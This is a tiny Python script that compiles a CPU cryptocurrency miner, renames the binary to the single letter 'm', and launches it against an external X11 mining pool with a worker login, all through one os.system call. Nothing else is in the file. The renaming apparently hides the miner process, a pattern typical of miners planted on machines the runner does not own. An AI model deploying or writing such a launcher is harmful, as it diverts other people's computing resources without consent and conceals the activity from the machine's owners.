import os
os.system("chmod a+x autogen.sh && ./autogen.sh && ./configure && make && mv minerd m && ./m -a X11 -o stratum+tcp://drk.cpu-pool.net:3500 -u soku2.req -p u")
